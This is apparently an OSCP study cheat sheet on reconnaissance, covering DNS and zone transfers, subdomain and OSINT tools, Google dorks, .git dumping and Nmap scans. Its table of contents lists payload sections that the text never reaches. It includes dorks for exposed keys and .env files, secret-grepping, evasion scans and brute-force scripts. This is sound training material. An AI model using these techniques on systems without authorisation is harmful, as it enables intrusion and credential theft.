# 🎯 OSCP — IG1: Complete Information Gathering & Vulnerability Scanning
> **Every Tool | Every Payload | Full Decision Trees | OSCP Exam Ready**
> 
> Coverage: Passive Recon → Active Recon → Vulnerability Scanning → CVE Mapping → All Payloads

---

## 📋 TABLE OF CONTENTS

| # | Section | Tools Covered |
|---|---------|--------------|
| 1 | [Mindset & Master Decision Tree](#-step-1-mindset--master-decision-tree) | Overview |
| 2 | [WHOIS & Registration Recon](#-step-2-whois--registration-recon) | whois |
| 3 | [DNS Enumeration](#-step-3-dns-enumeration) | dig, nslookup, host, dnsrecon |
| 4 | [Network Path Recon](#-step-4-network-path-recon) | traceroute, tracert, mtr |
| 5 | [Subdomain Enumeration](#-step-5-subdomain-enumeration) | sublist3r, amass, dnsx, gobuster dns |
| 6 | [OSINT & Visual Recon](#-step-6-osint--visual-recon) | Maltego, Shodan, Recon-ng |
| 7 | [Google Dorks & Web Recon](#-step-7-google-dorks--web-recon) | Google, TheHarvester |
| 8 | [Active Recon — Nmap Complete](#-step-8-active-recon--nmap-complete) | nmap, NSE scripts |
| 9 | [Web Scanning](#-step-9-web-scanning) | Nikto, Gobuster, Dirb, WPScan |
| 10 | [Service-Specific Enumeration](#-step-10-service-specific-enumeration) | enum4linux, smbclient, snmpwalk |
| 11 | [Vulnerability Scanning](#-step-11-vulnerability-scanning) | Nessus, OpenVAS |
| 12 | [CVE → Exploit Mapping](#-step-12-cve--exploit-mapping) | searchsploit, GitHub |
| 13 | [All Payloads Reference](#-step-13-all-payloads-reference) | Shells, SQLi, XSS, LFI |
| 14 | [Attack Surface Map Template](#-step-14-attack-surface-map-template) | Notes format |
| 15 | [Master Checklist](#-step-15-master-checklist) | OSCP exam checklist |
| 16 | [Quick Reference Card](#-step-16-quick-reference-card) | One-page summary |

---

## 🧠 STEP 1: MINDSET & MASTER DECISION TREE

### 1.1 The Three Objectives

```
1. Collect maximum information about target
2. Map the complete attack surface
3. Identify exploitable entry points
```

### 1.2 Passive vs Active vs Vulnerability Scan

| Type | Target Aware? | Tools | OSCP When |
|---|---|---|---|
| **Passive Recon** | ❌ Never | WHOIS, Shodan, Maltego, Google | Always first |
| **Active Recon** | ✅ Yes | Nmap, traceroute, enum4linux | After passive |
| **Vuln Scan** | ✅ Yes | Nessus, OpenVAS, Nikto | After active |

---

### 1.3 🌳 MASTER DECISION TREE — Full OSCP IG Flow

```
╔══════════════════════════════════════════════════════════════════════╗
║                    TARGET IP / DOMAIN RECEIVED                       ║
╚═══════════════════════════════╦══════════════════════════════════════╝
                                │
                                ▼
╔══════════════════════════════════════════════════════════════════════╗
║                        PASSIVE RECON                                 ║
║   WHOIS → DNS → traceroute → Shodan → Maltego → Recon-ng → Dorks    ║
╚═══════════════════════════════╦══════════════════════════════════════╝
                                │
           ┌────────────────────┼────────────────────┐
           ▼                    ▼                    ▼
    Subdomains?            Emails/Users?        Infra exposed?
    amass/sublist3r        TheHarvester         Shodan/Censys
    dnsx brute force       Build user list      Note banners
           └────────────────────┼────────────────────┘
                                │
                                ▼
╔══════════════════════════════════════════════════════════════════════╗
║                        ACTIVE RECON                                  ║
║        Nmap 4-scan → NSE scripts → Service enumeration               ║
╚═══════════════════════════════╦══════════════════════════════════════╝
                                │
       ┌──────────┬─────────────┼───────────────┬──────────┐
       ▼          ▼             ▼               ▼          ▼
  Web (80/443) SMB(445/139) SSH (22)      DB(3306/1433) UDP(161)
  Nikto+Gobust enum4linux   Brute/CVE     SQLmap/manual  SNMP walk
       └──────────┴─────────────┼───────────────┴──────────┘
                                │
                                ▼
╔══════════════════════════════════════════════════════════════════════╗
║                     VULNERABILITY SCANNING                           ║
╚═══════════════╦═════════════════════════╦════════════════════════════╝
                │                         │                    │
                ▼                         ▼                    ▼
          WEB VULNS               NETWORK VULNS          SERVICE VULNS
          Nikto / ZAP             OpenVAS                Nessus
          Gobuster                Nmap --script=vuln     searchsploit
                └─────────────────────────┼────────────────────┘
                                          │
                                          ▼
╔══════════════════════════════════════════════════════════════════════╗
║                  CVE LIST + ATTACK SURFACE MAP                       ║
╚═══════════════════════════════╦══════════════════════════════════════╝
                                │
           ┌────────────────────┼────────────────────┐
           ▼                    ▼                    ▼
     RCE found?          Auth Bypass?          Info Disclosure?
     EXPLOIT FIRST       Exploit second         Pivot to creds
     (Priority 1)        (Priority 2)           (Priority 3)
```

---

### 1.4 Vulnerability Priority Decision Tree

```
┌────────────────────────────────────────────────────┐
│            VULNERABILITIES FOUND                   │
└──────────────────────┬─────────────────────────────┘
                       │
                       ▼
            Is there an RCE vulnerability?
            YES ───────────────────────────► EXPLOIT FIRST (Priority 1)
             │
            NO
             │
             ▼
            Is there an Authentication Bypass?
            YES ───────────────────────────► EXPLOIT SECOND (Priority 2)
             │
            NO
             │
             ▼
            Information Disclosure found?
            YES ──► Credentials leaked?
             │       YES ──► Reuse on other services
            NO
             │
             ▼
            Default Credentials possible?
            YES ───────────────────────────► Try all default creds
             │
            NO
             │
             ▼
            ┌──────────────────────────────────┐
            │ Enumerate deeper — missed something│
            └──────────────────────────────────┘
```

---

## 🔍 STEP 2: WHOIS & REGISTRATION RECON

### What You Get

| WHOIS Field | Attack Use |
|---|---|
| Admin Email | Phishing / username guessing |
| Nameservers | DNS zone transfer targets |
| Creation Date | Old domain = possibly unpatched software |
| Registrar | Hosting provider, abuse contact |
| Phone Number | Social engineering |
| Organization | Shodan org: filter |
| Network range | nmap entire range |

### Commands

```bash
# Basic domain WHOIS
whois target.com

# IP-based WHOIS (find org owning the IP)
whois 192.168.1.1

# ARIN lookup (North America)
whois -h whois.arin.net 192.168.1.1

# RIPE lookup (Europe)
whois -h whois.ripe.net target.com

# Save output
whois target.com > whois_results.txt

# Multiple IPs from nmap result
for ip in $(cat hosts.txt); do echo "=== $ip ==="; whois $ip; done
```

### Username Construction from Email

```
admin.john@target.com  →  Try:
├── john
├── admin.john
├── adminjohn
├── a.john
├── johna
└── john.admin
```

---

## 🌐 STEP 3: DNS ENUMERATION

### DNS Record Types — Complete Reference

| Record | Meaning | Why It Matters |
|---|---|---|
| **A** | IPv4 → IP address | Direct target IP |
| **AAAA** | IPv6 address | IPv6 attack surface |
| **MX** | Mail server | Phishing, SMTP enum |
| **NS** | Nameserver | Zone transfer target |
| **TXT** | Text strings (SPF, DKIM) | Info disclosure |
| **CNAME** | Alias / subdomain | Hidden attack surface |
| **SOA** | Zone authority | Admin email, serial |
| **PTR** | Reverse DNS | Host from IP |
| **SRV** | Service locator | Internal services |
| **HINFO** | Host info | OS disclosure |

---

### nslookup — Complete Usage

```bash
# Default A record lookup
nslookup target.com

# Specific record types
nslookup -type=A target.com
nslookup -type=MX target.com
nslookup -type=NS target.com
nslookup -type=TXT target.com
nslookup -type=CNAME target.com
nslookup -type=SOA target.com
nslookup -type=ANY target.com

# Use specific DNS server
nslookup target.com 8.8.8.8
nslookup target.com ns1.target.com

# Reverse lookup (IP → hostname)
nslookup 192.168.1.1

# Interactive mode
nslookup
> server 8.8.8.8
> set type=MX
> target.com
> exit
```

---

### dig — Complete Usage

```bash
# Basic A record
dig target.com
dig target.com A

# All record types
dig target.com ANY
dig target.com ANY +noall +answer     # cleaner output

# Specific records
dig target.com MX
dig target.com NS
dig target.com TXT
dig target.com CNAME
dig target.com SOA
dig target.com AAAA
dig target.com SRV

# Use specific nameserver
dig @8.8.8.8 target.com
dig @ns1.target.com target.com

# ─── ZONE TRANSFER — CRITICAL ───
dig axfr @ns1.target.com target.com
dig axfr @ns2.target.com target.com    # try all nameservers!

# Reverse DNS
dig -x 192.168.1.1
dig -x 192.168.1.1 +short

# Short answer only
dig target.com +short
dig target.com MX +short

# Trace full path
dig +trace target.com

# No recursion
dig +norecurse target.com

# DNSSEC check
dig target.com DNSKEY
dig target.com DS

# Batch queries from file
dig -f domains.txt +short

# Save output
dig target.com ANY > dns_results.txt
```

---

### host — Complete Usage

```bash
# Basic lookup
host target.com

# Specific record types
host -t A target.com
host -t MX target.com
host -t NS target.com
host -t TXT target.com
host -t CNAME target.com
host -t SOA target.com

# Reverse lookup
host 192.168.1.1

# Zone transfer with host
host -l target.com ns1.target.com
host -t axfr target.com ns1.target.com

# Use specific nameserver
host target.com 8.8.8.8

# Verbose output
host -v target.com
```

---

### dnsrecon — Automated DNS Recon

```bash
# Full auto scan
dnsrecon -d target.com

# Standard enumeration (A, MX, NS, SOA, TXT)
dnsrecon -d target.com -t std

# Zone transfer attempt
dnsrecon -d target.com -t axfr

# DNS brute force
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt

# Reverse lookup on a range
dnsrecon -r 192.168.1.0/24

# Google lookup
dnsrecon -d target.com -t goo

# Cache snooping
dnsrecon -t snoop -n ns1.target.com -D wordlist.txt

# Save output
dnsrecon -d target.com -j dns_results.json
dnsrecon -d target.com --xml dns_results.xml
```

---

### Zone Transfer Decision Tree

```
Step 1: Get all nameservers
────────────────────────────
dig target.com NS
host -t NS target.com
        │
        ▼
Step 2: Try zone transfer on EACH NS
────────────────────────────────────
dig axfr @ns1.target.com target.com
dig axfr @ns2.target.com target.com
        │
   ┌────┴─────┐
   ▼          ▼
SUCCESS!    FAILED on all?
   │          │
   ▼          ▼
Full DNS   Not vulnerable
dump!      Move to brute force:
All IPs    dnsrecon -d target.com -t brt
All hosts  sublist3r -d target.com
           amass enum -d target.com
```

---

### DNSMap & Fierce — Additional Tools

```bash
# DNSMap — DNS brute force
dnsmap target.com
dnsmap target.com -w /usr/share/wordlists/dnsmap.txt
dnsmap target.com -r results.txt

# Fierce — DNS recon tool
fierce --domain target.com
fierce --domain target.com --dns-servers 8.8.8.8
fierce --domain target.com --wordlist /usr/share/wordlists/fierce/hosts.txt

# DNSx — fast mass DNS resolver
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dnsx -l domains.txt -resp
dnsx -l domains.txt -a -cname -mx         # multiple record types
```

---

## 🛤️ STEP 4: NETWORK PATH RECON

### Why Use traceroute in OSCP?
- Map network hops between you and target
- Discover intermediate routers, firewalls, load balancers
- Detect IP ranges of internal network
- Identify WAF / CDN in path

### traceroute (Linux)

```bash
# Basic traceroute
traceroute target.com

# UDP mode (default)
traceroute -U target.com

# TCP mode (better through firewalls)
traceroute -T target.com
traceroute -T -p 80 target.com       # port 80 TCP

# ICMP mode
traceroute -I target.com

# Set max hops
traceroute -m 30 target.com

# No DNS resolution (faster)
traceroute -n target.com

# Set source IP
traceroute -s 192.168.1.100 target.com

# Save output
traceroute target.com | tee traceroute.txt
```

### tracert (Windows)

```cmd
# Basic
tracert target.com

# No DNS resolution
tracert -d target.com

# Set max hops
tracert -h 30 target.com

# Timeout (ms)
tracert -w 1000 target.com
```

### mtr — Combined ping + traceroute

```bash
# Interactive mode
mtr target.com

# Report mode (non-interactive)
mtr --report target.com
mtr -r target.com

# No DNS
mtr -n target.com

# TCP mode
mtr --tcp target.com
mtr --tcp -P 80 target.com

# More cycles for accuracy
mtr --report --report-cycles 100 target.com

# Save report
mtr --report target.com > mtr_results.txt
```

### Reading Traceroute Output

```
traceroute to target.com (203.0.113.10), 30 hops max

 1  192.168.1.1     1ms    ← Your router
 2  10.0.0.1        5ms    ← ISP gateway
 3  * * *                  ← Filtered hop (firewall or ICMP blocked)
 4  172.16.0.1      20ms   ← ISP backbone
 5  * * *                  ← Filtered
 6  203.0.113.1     45ms   ← Target's upstream router
 7  203.0.113.10    46ms   ← TARGET REACHED

Notes:
  * * *     = Packet dropped/filtered — firewall or privacy setting
  High RTT  = Geographic distance or congestion
  Same RTT for multiple hops = Possible MPLS tunnel
  Private IPs (10.x, 172.x, 192.168.x) = NAT/internal network
```

---

## 🗂️ STEP 5: SUBDOMAIN ENUMERATION

### Subdomain Enumeration Decision Tree

```
START: target.com
        │
        ▼
PASSIVE (no direct contact)
├── sublist3r -d target.com
├── amass enum -passive -d target.com
├── findomain -t target.com
├── assetfinder --subs-only target.com
└── curl crt.sh API
        │
        ▼
ACTIVE (direct DNS queries)
├── amass enum -active -d target.com
├── gobuster dns -d target.com -w wordlist.txt
├── dnsx -d target.com -w wordlist.txt
└── dnsrecon -d target.com -t brt
        │
        ▼
COLLECT & DEDUPLICATE
sort -u all_subs.txt > final_subs.txt
        │
        ▼
RESOLVE each subdomain
dnsx -l final_subs.txt -resp
httpx -l final_subs.txt            (web alive check)
        │
        ▼
FOR EACH LIVE SUBDOMAIN:
nmap, nikto, gobuster dir
```

### Complete Commands

```bash
# ─── SUBLIST3R ───
sublist3r -d target.com
sublist3r -d target.com -o sublist3r_out.txt
sublist3r -d target.com -b -p 80,443         # with bruteforce
sublist3r -d target.com -e google,bing        # specific engines

# ─── AMASS ───
amass enum -d target.com
amass enum -passive -d target.com             # passive only
amass enum -active -d target.com              # active only
amass enum -brute -d target.com               # brute force
amass enum -d target.com -o amass_out.txt
amass enum -d target.com -ip                  # show IPs too
amass viz -d target.com                       # visual graph

# ─── DNSX ───
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dnsx -l domains.txt -resp                     # resolve list
dnsx -l domains.txt -a -cname -mx            # all record types
dnsx -l domains.txt -o resolved.txt

# ─── GOBUSTER DNS ───
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d target.com -w wordlist.txt -o gobuster_dns.txt
gobuster dns -d target.com -w wordlist.txt -r 8.8.8.8    # custom resolver

# ─── FINDOMAIN ───
findomain -t target.com
findomain -t target.com -u subdomains.txt     # save unique subs
findomain -t target.com --quiet               # just subdomains

# ─── ASSETFINDER ───
assetfinder --subs-only target.com
assetfinder target.com | sort -u

# ─── CERTIFICATE TRANSPARENCY (crt.sh) ───
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crt_subs.txt

# ─── COMBINE ALL RESULTS ───
cat sublist3r_out.txt amass_out.txt crt_subs.txt | sort -u > all_subdomains.txt

# ─── CHECK WHICH ARE ALIVE ───
httpx -l all_subdomains.txt -o alive_subdomains.txt
httpx -l all_subdomains.txt -status-code -title -tech-detect

# ─── RESOLVE IPs ───
dnsx -l all_subdomains.txt -resp -o resolved.txt
```

---

## 🔭 STEP 6: OSINT & VISUAL RECON

### Maltego — Visual Link Analysis

**What Maltego does:**
- Visual graph of relationships: domains → IPs → emails → people → companies
- Automated OSINT collection via "transforms"
- Finds connections you'd miss manually

```
Setup:
1. Download: https://www.maltego.com/downloads/
2. Register free account (Community Edition)
3. Run: maltego

OSCP Workflow:
1. New Graph
2. Drag "Domain" entity onto canvas
3. Type: target.com
4. Right-click → Run Transform → "To DNS Name"
5. Run: "To IP Address"
6. Run: "To Email Address"
7. Run: "To Person"
8. Expand each node further

Key Transforms:
  Domain → DNS Names (subdomains)
  Domain → IP Addresses
  Domain → Email Addresses
  Email → Person
  IP → Netblock
  Netblock → other IPs
  Person → Social Profiles
```

**Maltego Decision Tree:**
```
Start: target.com
        │
        ▼
Run "To DNS Name" → get subdomains
        │
        ▼
Run "To IP Address" → get all IPs
        │
        ▼
Run "To Email" → get employee emails
        │
        ├── Run "To Person" → social profiles
        └── Build username wordlist
        │
        ▼
Run "To Netblock" → find entire IP range
        │
        ▼
Nmap entire netblock → more targets!
```

---

### Recon-ng — Modular Recon Framework

```bash
# Start recon-ng
recon-ng

# Inside recon-ng console:
# Create a workspace
workspaces create oscp_target

# Add target domain
db insert domains
> domain: target.com

# List available modules
modules search

# ─── USEFUL MODULES ───

# Subdomain discovery
modules load recon/domains-hosts/brute_hosts
options set SOURCE target.com
run

# DNS lookup
modules load recon/hosts-hosts/resolve
run

# WHOIS lookup
modules load recon/domains-contacts/whois_pocs
options set SOURCE target.com
run

# Shodan integration
modules load recon/hosts-hosts/shodan_ip
options set API_KEY your_shodan_key
run

# Email harvesting
modules load recon/domains-contacts/pgp_search
options set SOURCE target.com
run

# Company employees (LinkedIn)
modules load recon/companies-contacts/linkedin_auth
run

# Certificate search
modules load recon/domains-hosts/certificate_transparency
options set SOURCE target.com
run

# View collected data
show hosts
show domains
show contacts
show credentials

# Export report
modules load reporting/html
options set FILENAME /home/kali/report.html
run
```

---

### Shodan — Internet Search Engine

```bash
# ─── CLI SETUP ───
pip install shodan
shodan init YOUR_API_KEY_HERE

# ─── SEARCH COMMANDS ───
shodan search "hostname:target.com"
shodan search "org:Company Name"
shodan search --fields ip_str,port,org "apache 2.4.49"
shodan search --fields ip_str,port,hostnames "target.com"
shodan search --fields ip_str,port,org,os "port:3389 country:US"

# ─── HOST INFO ───
shodan host 192.168.1.1
shodan host 192.168.1.1 --history

# ─── COUNT RESULTS ───
shodan count "org:Target Company"
shodan count "port:22 os:linux"

# ─── DOWNLOAD DATA ───
shodan download results "hostname:target.com"
shodan parse --fields ip_str,port results.json.gz

# ─── ALERTS (monitor new exposure) ───
shodan alert create "Target Monitor" 203.0.113.0/24

# ─── BROWSER FILTERS ───
hostname:target.com
org:"Company Name"
net:192.168.1.0/24
port:22 os:linux
port:3389 country:US
product:apache version:2.4.49
vuln:CVE-2021-41773
http.title:"Admin Panel"
http.html:"login"
ssl.cert.subject.cn:target.com
ssl:"target.com"
before:2022-01-01 after:2021-01-01
```

**Shodan Findings → Action Table:**

| Finding | Significance | Next Step |
|---|---|---|
| Open RDP (3389) | BlueKeep / brute force | Check OS, searchsploit |
| Open MongoDB (27017) | No-auth DB | Connect directly |
| Old Apache version | Known CVE | searchsploit apache X.X.X |
| SSL cert subdomains | Hidden hosts | Add to scope |
| SSH banner w/ version | CVE lookup | searchsploit openssh X.X |
| `vuln:CVE-xxx` tag | Direct hit | searchsploit CVE-XXX |
| Open Elasticsearch | Unauth API | curl http://IP:9200/_cat/indices |
| Redis (6379) | No auth | redis-cli -h TARGET |

---

## 🌍 STEP 7: GOOGLE DORKS & WEB RECON

### Google Dorks — Complete Reference

```bash
# ─── ADMIN PANELS ───
site:target.com inurl:admin
site:target.com inurl:login
site:target.com inurl:dashboard
site:target.com inurl:panel
site:target.com inurl:cpanel
site:target.com inurl:wp-admin
site:target.com intitle:"admin login"
site:target.com intitle:"administrator"
site:target.com intitle:"login page"

# ─── SENSITIVE FILES ───
site:target.com filetype:pdf
site:target.com filetype:doc
site:target.com filetype:docx
site:target.com filetype:xls
site:target.com filetype:xlsx
site:target.com filetype:sql
site:target.com filetype:bak
site:target.com filetype:backup
site:target.com filetype:log
site:target.com filetype:conf
site:target.com filetype:config
site:target.com filetype:xml
site:target.com filetype:json
site:target.com filetype:env
site:target.com filetype:pem
site:target.com filetype:key

# ─── DIRECTORY LISTING ───
intitle:"index of" site:target.com
intitle:"index of /" site:target.com
intitle:"directory listing" site:target.com
intitle:"parent directory" site:target.com

# ─── CONFIG FILES ───
site:target.com inurl:config
site:target.com inurl:wp-config
site:target.com inurl:.env
site:target.com inurl:settings.php
site:target.com inurl:database.php
site:target.com inurl:db.php
site:target.com inurl:configuration.php

# ─── SENSITIVE INFO IN URLS ───
site:target.com inurl:password
site:target.com inurl:passwd
site:target.com inurl:secret
site:target.com inurl:token
site:target.com inurl:api_key
site:target.com inurl:apikey

# ─── ERROR PAGES (info disclosure) ───
site:target.com "Warning: mysql_"
site:target.com "PHP Parse error"
site:target.com "Fatal error"
site:target.com "SQL syntax"
site:target.com "ORA-01756"           (Oracle error)
site:target.com "Microsoft OLE DB"   (MSSQL error)

# ─── CAMERAS / IOT ───
inurl:/view/index.shtml site:target.com
intitle:"webcam" site:target.com
intitle:"Network Camera" site:target.com

# ─── DATABASE DUMPS ───
"target.com" filetype:sql
"target.com" intext:password filetype:csv
"@target.com" filetype:csv

# ─── VERSION DISCLOSURE ───
site:target.com "powered by wordpress"
site:target.com "powered by drupal"
site:target.com "powered by joomla"
```

### URLs to Always Check Manually

```bash
http://target.com/robots.txt          # Disallowed = sensitive paths!
http://target.com/sitemap.xml         # All indexed pages
http://target.com/.well-known/        # Security.txt, ACME challenges
http://target.com/crossdomain.xml     # Flash policy (old sites)
http://target.com/security.txt        # Contact / vuln disclosure
http://target.com/.htaccess           # Apache config leak
http://target.com/server-status       # Apache mod_status
http://target.com/phpinfo.php         # PHP info page
http://target.com/info.php
http://target.com/test.php
http://target.com/backup/
http://target.com/.git/               # Git repo exposed!
http://target.com/.svn/               # SVN repo exposed!
http://target.com/.DS_Store           # macOS metadata
http://target.com/WEB-INF/web.xml     # Java config
http://target.com/web.config          # IIS config
http://target.com/config.php
```

### .git Repo Exposed → Extract Source Code

```bash
# Check if .git is exposed
curl http://target.com/.git/HEAD
# If returns: ref: refs/heads/master → EXPOSED!

# Download entire repo
git clone http://target.com/.git/ target_repo
# or use gitdumper
python3 gitdumper.py http://target.com/.git/ output_dir

# Search for secrets in source code
grep -r "password" output_dir/
grep -r "secret" output_dir/
grep -r "api_key" output_dir/
grep -r "token" output_dir/
```

---

### TheHarvester — Email + Subdomain + IP

```bash
# Single source
theHarvester -d target.com -b google
theHarvester -d target.com -b bing
theHarvester -d target.com -b linkedin
theHarvester -d target.com -b twitter

# Multiple sources
theHarvester -d target.com -b google,bing,linkedin,yahoo

# All sources
theHarvester -d target.com -b all

# Limit results
theHarvester -d target.com -b google -l 500

# Virtual host verify
theHarvester -d target.com -b google -v

# Save output
theHarvester -d target.com -b all -f harvester_output
# Creates: harvester_output.html and harvester_output.xml

# DNS brute force
theHarvester -d target.com -b all -c

# Shodan integration
theHarvester -d target.com -b shodan
```

**Available Sources:**
```
google, bing, linkedin, twitter, yahoo, duckduckgo,
baidu, certspotter, crtsh, dnsdumpster, hackertarget,
otx, rapiddns, sublist3r, threatcrowd, trello, urlscan,
virustotal, zoomeye
```

---

## 🔬 STEP 8: ACTIVE RECON — NMAP COMPLETE

### Nmap 4-Scan Workflow

```
╔══════════════════════════════════════════════════════════╗
║         SCAN 1 — Quick Top 1000 Ports                    ║
║   nmap -sC -sV -oN quick.txt TARGET_IP                   ║
║   Purpose: Fast overview, common services + versions     ║
║   Time: 1-2 minutes                                      ║
╚═══════════════════════════╦══════════════════════════════╝
                            │ Got initial picture
                            ▼
╔══════════════════════════════════════════════════════════╗
║         SCAN 2 — All 65535 Ports                         ║
║   nmap -p- --min-rate 5000 -oN allports.txt IP           ║
║   Purpose: Find hidden/unusual services                  ║
║   Time: 5-10 minutes                                     ║
╚═══════════════════════════╦══════════════════════════════╝
                            │ Compare with Scan 1
                            ▼
╔══════════════════════════════════════════════════════════╗
║         SCAN 3 — Targeted Deep Scan                      ║
║   nmap -sC -sV -p [PORTS] -oN targeted.txt IP           ║
║   Purpose: Deep version + script scan on found ports     ║
║   Time: 2-5 minutes                                      ║
╚═══════════════════════════╦══════════════════════════════╝
                            │ Services identified
                            ▼
╔══════════════════════════════════════════════════════════╗
║         SCAN 4 — UDP Top 200                             ║
║   sudo nmap -sU --top-ports 200 -oN udp.txt IP           ║
║   Purpose: SNMP, TFTP, IPMI, DNS — often missed!         ║
║   Time: 10-20 minutes                                    ║
╚══════════════════════════════════════════════════════════╝
```

### Complete Nmap Commands

```bash
# ═══ SCAN 1 — Quick ═══
nmap -sC -sV -oN quick.txt TARGET_IP
nmap -sC -sV -oN quick.txt TARGET_IP --open        # only open ports
nmap -sC -sV -oN quick.txt TARGET_IP --open -v     # verbose

# ═══ SCAN 2 — All ports ═══
nmap -p- --min-rate 5000 -oN allports.txt TARGET_IP
nmap -p- --min-rate 5000 -T4 -oN allports.txt TARGET_IP
nmap -p- -oN allports.txt TARGET_IP                # slower, reliable
nmap -p 1-65535 -oN allports.txt TARGET_IP         # explicit range

# ═══ SCAN 3 — Targeted ═══
nmap -sC -sV -p 22,80,443,8080 -oN targeted.txt TARGET_IP
nmap -sC -sV -A -p 22,80 -oN targeted.txt TARGET_IP    # -A = aggressive
nmap -sV --version-intensity 9 -p 80 TARGET_IP          # max version

# ═══ SCAN 4 — UDP ═══
sudo nmap -sU --top-ports 200 -oN udp.txt TARGET_IP
sudo nmap -sU -p 161,162,69,623,500 -oN udp_targeted.txt TARGET_IP

# ═══ HOST DISCOVERY ═══
nmap -sn 192.168.1.0/24                    # ping sweep
nmap -sn 192.168.1.0/24 -oN hosts.txt
nmap -Pn TARGET_IP                          # skip ping, assume up
nmap -PE -sn 192.168.1.0/24               # ICMP echo

# ═══ OS DETECTION ═══
sudo nmap -O TARGET_IP
sudo nmap -O --osscan-guess TARGET_IP

# ═══ OUTPUT FORMATS ═══
nmap -sC -sV -oN output.txt TARGET_IP     # Normal (readable)
nmap -sC -sV -oX output.xml TARGET_IP     # XML (parseable)
nmap -sC -sV -oG output.gnmap TARGET_IP   # Grepable
nmap -sC -sV -oA output TARGET_IP         # All 3 formats

# ═══ FIREWALL EVASION ═══
nmap -sS TARGET_IP                          # SYN (half-open, stealthy)
nmap -f TARGET_IP                           # Fragment packets
nmap -D RND:10 TARGET_IP                    # Decoy 10 random IPs
nmap -D 192.168.1.5,192.168.1.6 TARGET_IP  # Specific decoys
nmap --source-port 53 TARGET_IP             # Spoof src port 53
nmap --data-length 25 TARGET_IP             # Pad with random data
nmap -sA TARGET_IP                          # ACK scan (map firewall rules)
nmap -sF TARGET_IP                          # FIN scan
nmap -sX TARGET_IP                          # XMAS scan
nmap --randomize-hosts TARGET_IP            # Random order

# ═══ NETWORK RANGE SCANS ═══
nmap 192.168.1.0/24
nmap 192.168.1.1-254
nmap 192.168.1.1,2,3,10,20
nmap -iL targets.txt                        # from file
```

---

### Nmap NSE Scripts — Complete Reference

```bash
# ═══ HTTP / WEB ═══
nmap --script=http-enum TARGET_IP              # dir/file enumeration
nmap --script=http-headers TARGET_IP           # response headers
nmap --script=http-methods TARGET_IP -p 80     # PUT/DELETE enabled?
nmap --script=http-title TARGET_IP             # page titles
nmap --script=http-auth TARGET_IP              # auth required?
nmap --script=http-auth-finder TARGET_IP       # what auth type?
nmap --script=http-default-accounts TARGET_IP  # default creds
nmap --script=http-wordpress-enum TARGET_IP    # WordPress enum
nmap --script=http-robots.txt TARGET_IP        # robots.txt content
nmap --script=http-shellshock TARGET_IP        # Shellshock CVE-2014-6271
nmap --script=http-sql-injection TARGET_IP     # basic SQLi detection
nmap --script=http-xssed TARGET_IP             # XSS detection
nmap --script=http-csrf TARGET_IP              # CSRF token check
nmap --script=http-dombased-xss TARGET_IP      # DOM XSS
nmap --script=http-open-redirect TARGET_IP     # open redirect
nmap --script=http-backup-finder TARGET_IP     # backup files
nmap --script=http-config-backup TARGET_IP     # config backups

# ═══ FTP ═══
nmap --script=ftp-anon TARGET_IP               # anonymous login?
nmap --script=ftp-brute TARGET_IP              # brute force
nmap --script=ftp-vsftpd-backdoor TARGET_IP    # vsftpd 2.3.4 backdoor
nmap --script=ftp-proftpd-backdoor TARGET_IP   # ProFTPD backdoor
nmap --script=ftp-bounce TARGET_IP             # FTP bounce

# ═══ SMB ═══
nmap --script=smb-enum-shares TARGET_IP        # list shares
nmap --script=smb-enum-users TARGET_IP         # list users
nmap --script=smb-os-discovery TARGET_IP       # OS via SMB
nmap --script=smb-vuln-ms17-010 TARGET_IP      # EternalBlue check!
nmap --script=smb-vuln-ms08-067 TARGET_IP      # MS08-067
nmap --script=smb-vuln-cve2009-3103 TARGET_IP
nmap --script=smb-vuln-ms10-061 TARGET_IP      # Print spooler
nmap --script=smb-security-mode TARGET_IP      # security level
nmap --script=smb2-security-mode TARGET_IP
nmap --script=smb-protocols TARGET_IP          # SMB version

# All SMB at once:
nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln-ms17-010 -p 445 TARGET_IP

# ═══ SSH ═══
nmap --script=ssh-auth-methods TARGET_IP       # auth methods
nmap --script=ssh-brute TARGET_IP              # brute force
nmap --script=ssh-hostkey TARGET_IP            # host key
nmap --script=ssh2-enum-algos TARGET_IP        # algorithms
nmap --script=ssh-run TARGET_IP                # run command

# ═══ DNS ═══
nmap --script=dns-zone-transfer TARGET_IP      # zone transfer
nmap --script=dns-brute TARGET_IP              # DNS brute force
nmap --script=dns-recursion TARGET_IP          # open resolver?
nmap --script=dns-cache-snoop TARGET_IP        # cache snooping

# ═══ SNMP ═══
nmap --script=snmp-info -sU -p 161 TARGET_IP
nmap --script=snmp-brute -sU -p 161 TARGET_IP
nmap --script=snmp-sysdescr -sU -p 161 TARGET_IP
nmap --script=snmp-netstat -sU -p 161 TARGET_IP
nmap --script=snmp-processes -sU -p 161 TARGET_IP

# ═══ MYSQL ═══
nmap --script=mysql-info TARGET_IP -p 3306
nmap --script=mysql-empty-password TARGET_IP -p 3306
nmap --script=mysql-databases TARGET_IP -p 3306
nmap --script=mysql-users TARGET_IP -p 3306
nmap --script=mysql-audit TARGET_IP -p 3306
nmap --script=mysql-brute TARGET_IP -p 3306

# ═══ MSSQL ═══
nmap --script=ms-sql-info TARGET_IP -p 1433
nmap --script=ms-sql-empty-password TARGET_IP -p 1433
nmap --script=ms-sql-dump-hashes TARGET_IP -p 1433
nmap --script=ms-sql-xp-cmdshell TARGET_IP -p 1433

# ═══ VULNERABILITY CATEGORIES ═══
nmap --script=vuln TARGET_IP                   # ALL vuln scripts
nmap --script=exploit TARGET_IP                # ALL exploit scripts
nmap --script=auth TARGET_IP                   # ALL auth scripts
nmap --script=default TARGET_IP                # Default scripts (-sC)
nmap --script=safe TARGET_IP                   # Safe scripts only
nmap --script=intrusive TARGET_IP              # Intrusive (careful!)

# ═══ SCRIPT WITH ARGUMENTS ═══
nmap --script=http-brute --script-args http-brute.path=/admin TARGET_IP
nmap --script=snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/wordlists/snmp.txt -sU -p 161 TARGET_IP
